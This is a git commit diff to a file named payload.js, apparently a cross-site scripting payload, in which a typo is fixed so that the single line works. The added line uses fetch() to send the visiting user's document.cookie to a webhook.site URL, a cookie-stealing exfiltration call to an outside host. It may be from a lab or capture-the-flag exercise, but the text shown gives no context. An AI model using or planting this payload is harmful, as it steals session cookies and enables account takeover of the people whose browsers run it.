3edf5c5894771cdbeda238b72a1da68f84d12a4b
darhtb <119668661+darhtb@users.noreply.github.com>
2022-12-02 16:18:50 -0500

    Update payload.js

--- payload.js
+++ payload.js
@@ -1,1 +1,1 @@
-fetch('https://webhook.site/c5a83385-458f-4a80-8fc2-d85d590dd931?cookie=' + dokument.cookie);
+fetch('https://webhook.site/c5a83385-458f-4a80-8fc2-d85d590dd931?cookie=' + document.cookie);
